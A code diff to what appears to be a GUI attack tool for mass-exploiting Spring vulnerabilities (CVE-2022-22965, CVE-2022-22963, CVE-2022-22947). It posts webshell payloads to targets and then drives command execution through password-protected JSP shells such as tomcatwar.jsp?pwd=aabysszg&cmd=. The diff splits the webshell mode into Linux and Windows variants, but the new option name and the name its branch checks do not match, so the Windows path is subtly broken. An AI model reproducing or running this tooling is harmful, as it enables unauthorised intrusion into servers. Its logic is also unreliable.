@@ -46,7 +46,7 @@ class RootFrom:
       "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
       "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
       "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00")
-        cves = ("CVE-2022-22965","CVE-2022-22963","CVE-2022-22947","22965-13exp-shell","22965-aabyss-shell-post","22965-aabyss-shell-get")
+        cves = ("CVE-2022-22965","CVE-2022-22963","CVE-2022-22947","22965-13exp-shell","22965-aabyss-linux-post","22965-aabyss-win-post","22965-aabyss-shell-get")
         no_proxies = []
         proxy_list = []
         self.root = tk.Tk()
@@ -677,18 +677,20 @@ class RootFrom:
         try:
             requests.packages.urllib3.disable_warnings()
             if proxies != "":
-                if Vule == "22965-aabyss-shell-post":
+                if Vule == "22965-aabyss-linux-post":
                     requests.post(url, headers=Headers_1, data=data1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
                     sleep(1)
+                elif Vule == "22965-aabyss-win-get":
                     requests.post(url, headers=Headers_1, data=data2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
                     sleep(1)
                 elif Vule == "22965-aabyss-shell-get":
                     requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
                     sleep(1)
             else:
-                if Vule == "22965-aabyss-shell-post":
+                if Vule == "22965-aabyss-linux-post":
                     requests.post(url, headers=Headers_1, data=data1, timeout=6, allow_redirects=False, verify=False)
                     sleep(1)
+                elif Vule == "22965-aabyss-win-get":
                     requests.post(url, headers=Headers_1, data=data2, timeout=6, allow_redirects=False, verify=False)
                     sleep(1)
                 elif Vule == "22965-aabyss-shell-get":
@@ -838,7 +840,7 @@ class RootFrom:
             cmd = self.reverse_tcp.get()
             if self.CVEs.get() == 'CVE-2022-22965':
                 url_shell = url + "shell.jsp?cmd={}".format(cmd)
-            elif '22965-aabyss-shell' in self.CVEs.get():
+            elif '22965-aabyss' in self.CVEs.get():
                 url_shell = url + "tomcatwar.jsp?pwd=aabysszg&cmd={}".format(cmd)
             elif self.CVEs.get() == '22965-13exp-shell':
                 url_shell = url + "wbexp.jsp?pwd=13exp&cmd={}".format(cmd)
@@ -1034,7 +1036,7 @@ class RootFrom:
                         self.CVE_2022_22963(i, proxies,execcmd)
                     elif Vule == "CVE-2022-22947":
                         self.CVE_2022_22947(i, proxies,execcmd)
-                    elif "22965-aabyss-shell" in Vule:
+                    elif "22965-aabyss" in Vule:
                         self.CVE_2022_22965_aabysszg(i, proxies)
                         
         else:
@@ -1056,7 +1058,7 @@ class RootFrom:
                     messagebox.showinfo("提示","执行命令不能为空,请重试！")
                 else:
                     self.CVE_2022_22947(url, proxies,execcmd)
-            elif "22965-aabyss-shell" in Vule:
+            elif "22965-aabyss" in Vule:
                 back = self.CVE_2022_22965_aabysszg(url, proxies)
                 if "[-]" in back:
                     back = "[+]执行二次验证中 等待5秒"
